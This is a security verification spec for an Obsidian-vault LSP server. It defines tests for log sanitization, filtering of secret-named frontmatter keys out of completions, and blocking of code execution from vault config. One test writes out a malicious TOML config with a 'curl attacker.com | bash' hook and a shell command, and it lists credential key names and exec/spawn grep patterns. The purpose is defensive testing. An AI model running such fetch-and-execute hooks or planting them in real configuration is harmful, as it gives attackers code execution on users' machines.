---
title: Verification — Security — Information Disclosure
tags: [test/verification, "requirements/security/information-disclosure"]
aliases: [Verify Information Disclosure]
---

# Verification — Security — Information Disclosure

## Purpose

This document defines verification test cases for the information disclosure prevention security requirements of `flavor-grenade-lsp`. Each test case validates that the server does not leak sensitive vault content through log output, LSP completion responses, or vault-provided configuration that could trigger process execution. Obsidian vaults regularly contain sensitive personal data — journal entries, passwords in frontmatter, API keys, health records — and this server must not allow that content to escape the user's intended context. Requirements are defined in [[requirements/security/information-disclosure]] and threat context in [[research/security-threat-model]].

## Requirements Covered

| Planguage Tag | Gist | Phase |
|---|---|---|
| `Security.Disclosure.LogSanitization` | Server logs must never include vault document content; only paths, line numbers, codes, and error types | Phase 2 |
| `Security.Disclosure.CompletionFilter` | Completion candidates must not include values from blocked frontmatter key names (`password`, `token`, `secret`, `api_key`, etc.) | Phase 9 |
| `Security.Config.NoCodeExecution` | `.flavor-grenade.toml` schema must never include command-execution fields; vault config must never cause process spawning | Phase 1 (ongoing) |

---

## Test Cases

### TC-VER-SECD-001 — Security.Disclosure.LogSanitization

**Planguage Tag:** `Security.Disclosure.LogSanitization`
**Gist:** Server logs must never include vault document content; only file paths, line numbers, diagnostic codes, and error types may appear in log output.
**Type:** Agent-driven
**BDD Reference:** **BDD gap**
**Phase:** Phase 2

> [!WARNING] Threat: Server logs may be shared with the project for bug reports, captured by log aggregation tools, stored in world-readable locations, or accidentally committed to version control. Any log message containing vault document content (even a snippet in an error message) becomes a potential disclosure channel for journal entries, passwords, API keys, or medical notes stored in the vault.

**Setup:** A running `flavor-grenade-lsp` server instance with maximum logging verbosity enabled. A test vault containing documents with known sensitive strings.

**Agent-driven steps:**

1. Agent creates a test vault with documents containing the following known sensitive strings:
   - `vault/private.md` with frontmatter `password: test-secret-hunter2` and body text `My secret note: hunter2`
   - `vault/api-keys.md` with frontmatter `api_key: sk-proj-ABCDEFGHIJKLMNOP`
   - `vault/journal.md` with body text `Today I felt sentinel-content-xyz`
2. Agent starts the server against the test vault with maximum logging verbosity (e.g., `LOG_LEVEL=debug`). Agent captures all log output to a file.
3. Agent triggers a full vault indexing cycle by sending `initialize`, `initialized`, and then waiting for the server to complete background indexing.
4. Agent triggers several LSP operations that exercise error paths: `textDocument/hover` at a position with a broken wiki-link, `textDocument/definition` for a non-existent note, `textDocument/completion` in a complex frontmatter block.
5. Agent searches the captured log output for each of the known sensitive strings: `hunter2`, `sk-proj-ABCDEFGHIJKLMNOP`, `sentinel-content-xyz`.
6. Agent verifies none of the sensitive strings appear anywhere in the log output — not in error messages, debug traces, or diagnostic notifications.
7. Agent verifies the log output DOES contain file paths (e.g., `vault/private.md`) and diagnostic codes (e.g., `FG001`, `FG007`) — confirming the sanitization is selective, not a blanket suppression of all logging.
8. Agent confirms the result: 0% of log entries contain document content.

**Pass criterion:** 0% of log entries contain any substring from vault document files; logs contain only paths, line numbers, codes, and error types; diagnostic codes and file paths ARE logged (the filter is not over-broad).
**Fail criterion:** Any log entry containing a substring from vault document content (body text or frontmatter values).

---

### TC-VER-SECD-002 — Security.Disclosure.CompletionFilter

**Planguage Tag:** `Security.Disclosure.CompletionFilter`
**Gist:** Completion candidates derived from frontmatter values must not include values from sensitive key names (`password`, `token`, `secret`, `api_key`, `private_key`, `credential`, `auth`); the blocked key list must be configurable.
**Type:** Agent-driven
**BDD Reference:** **BDD gap**
**Phase:** Phase 9

> [!WARNING] Threat: Obsidian users sometimes store credentials in frontmatter (e.g., `api_key: sk-proj-XXXXX` for AI plugins, or `password: mypassword` for HTTP auth headers in Dataview queries). If the completion handler surfaces these values as `textDocument/completion` candidates, they appear in the editor's autocomplete UI where they could be accidentally pasted, captured by screen recording, or seen over the shoulder.

**Setup:** A running server instance with a test vault. The completion handler must be active (Phase 9 or later). A vault file with mixed sensitive and safe frontmatter.

**Agent-driven steps:**

1. Agent creates a test vault document `vault/mixed-frontmatter.md` with the following frontmatter:

   ```yaml
   ---
   title: Test Document
   aliases: [safe-alias, another-safe-alias]
   password: secret123
   api_key: sk-test-abc-xyz
   token: ghp-PAT-TOKEN-VALUE
   secret: my-secret-value
   private_key: RSA-PRIVATE-KEY-FAKE
   credential: user-credential-value
   auth: bearer-token-value
   tags: [safe-tag, another-tag]
   ---
   ```

2. Agent opens `vault/mixed-frontmatter.md` in the test editor session and triggers `textDocument/completion` at a `[[` position in any vault document (wiki-link completion context).
3. Agent inspects the completion candidate list returned by the server.
4. Agent verifies the following values do NOT appear in any completion candidate's `label`, `insertText`, `detail`, or `documentation` fields: `secret123`, `sk-test-abc-xyz`, `ghp-PAT-TOKEN-VALUE`, `my-secret-value`, `RSA-PRIVATE-KEY-FAKE`, `user-credential-value`, `bearer-token-value`.
5. Agent verifies the following values DO appear as completion candidates: `safe-alias`, `another-safe-alias` (from `aliases:` key — not a blocked key), `safe-tag`, `another-tag` (from `tags:` — not a blocked key). This confirms the filter is precise and does not over-block.
6. Agent modifies the `.flavor-grenade.toml` to add `my_custom_key` to the blocked key list. Creates a vault document with `my_custom_key: custom-blocked-value`. Triggers completion and verifies `custom-blocked-value` does not appear in candidates — confirming the blocked key list is configurable.
7. Agent verifies the blocked key list defaults match the requirement: `password`, `token`, `secret`, `api_key`, `private_key`, `credential`, `auth` are all blocked by default without any configuration.

**Pass criterion:** 0% of blocked-key frontmatter values appear in completion responses; `aliases:` and `tags:` values from the same document DO appear (selective filter); configurable blocked key list is honored.
**Fail criterion:** Any completion response containing a value from a blocked frontmatter key; `safe-alias` being incorrectly filtered out; the blocked key list being non-configurable.

---

### TC-VER-SECD-003 — Security.Config.NoCodeExecution

**Planguage Tag:** `Security.Config.NoCodeExecution`
**Gist:** The `.flavor-grenade.toml` configuration schema must never include fields that specify commands, executables, or scripts to be run by the server; vault-provided configuration must never cause process spawning.
**Type:** Both
**BDD Reference:** **BDD gap**
**Phase:** Phase 1 (ongoing)

> [!WARNING] Threat: The 2026 OpenCode vulnerability demonstrated that allowing a repository's configuration file to specify which LSP server binary to launch creates an arbitrary code execution vector. A malicious vault's `.flavor-grenade.toml` with a `[hooks] on_save = "curl attacker.com | bash"` field would execute arbitrary commands whenever the server processes a file event — with no user consent and no indication in the editor UI.

**Setup:** The TOML schema definition in `src/` (when it exists). A test vault with a crafted `.flavor-grenade.toml`. The server binary.

**Scripted steps:**

```bash
# 1. Inspect the TOML schema definition for command-execution field names
grep -rn 'command\|cmd\|exec\|script\|hook\|run\|shell\|binary' \
  src/config/ src/config*.ts 2>/dev/null | \
  grep -v '// \|/\*\|test\|spec' | head -20
# Expected: no fields of type string in an executable context

# 2. Search for any spawnSync, spawn, exec usage in config-parsing code
# that could be triggered by TOML content
grep -rn 'spawnSync\|spawn\b\|execFile\b\|fork\b' \
  src/config/ src/config*.ts 2>/dev/null | head -20
# Expected: no matches in config-related source files

# 3. Create a crafted .flavor-grenade.toml with command-execution fields
cat > /tmp/evil-config.toml << 'EOF'
[hooks]
on_index = "/bin/sh -c 'touch /tmp/pwned-by-config'"
on_save = "curl attacker.com | bash"

[formatter]
command = "evil-formatter"
args = ["--unsafe"]

[shell]
exec = "/bin/bash"
EOF
cp /tmp/evil-config.toml .flavor-grenade.toml.test

# 4. Start the server against a vault containing this config
# Verify /tmp/pwned-by-config is NOT created
rm -f /tmp/pwned-by-config
# (Server startup with test config — observe for 5 seconds)
echo "Verify /tmp/pwned-by-config does not exist after server processes evil-config.toml"
[ -f "/tmp/pwned-by-config" ] && \
  echo "FAIL: server executed hook from config!" || \
  echo "PASS: /tmp/pwned-by-config was not created"
rm -f .flavor-grenade.toml.test /tmp/evil-config.toml

# 5. Verify the schema documentation has no mention of hooks or command fields
grep -rn 'hook\|command\|exec\|script' docs/design/ docs/architecture/ 2>/dev/null | \
  grep -v '# \|comment\|test\|example\|prohibited\|must not\|never\|forbidden' | \
  grep -i 'config\|toml\|flavor-grenade' | head -10
```

**Agent-driven steps:**

1. Agent reads the TOML schema definition file in `src/` (the Zod or equivalent schema for `.flavor-grenade.toml`). Agent verifies the schema contains no field of any of these names: `command`, `cmd`, `exec`, `script`, `hook`, `run`, `shell`, `binary`, `path` (in an executable context), `formatter`, `hooks`.
2. Agent creates a test `.flavor-grenade.toml` in the vault root containing a `[hooks]` section with `on_index = "/bin/sh -c 'touch /tmp/pwned-by-config-agent'"`. Agent starts the server against this vault and waits 10 seconds.
3. Agent verifies `/tmp/pwned-by-config-agent` does NOT exist. Agent also verifies the server did not log any attempt to execute the hook value.
4. Agent verifies the server treats the unknown `[hooks]` section as an unrecognized configuration key and silently ignores it (falls back to defaults), rather than throwing a fatal error.
5. Agent reads `docs/adr/ADR002-ofm-only-scope.md` and verifies it explicitly documents that vault configuration files must never cause process spawning as a non-goal.
6. Agent searches `src/` for any code path where a string from `.flavor-grenade.toml` is passed as the first argument to any process-spawning function. Verifies no such path exists.

**Pass criterion:** 0 command-execution fields in the configuration schema; a crafted `[hooks]` section in `.flavor-grenade.toml` is silently ignored; no process is spawned from config values; the server remains fully functional with the unknown section ignored.
**Fail criterion:** Any server behaviour that executes a command, script, or external process in response to content in `.flavor-grenade.toml`; any command-like field in the TOML schema definition.
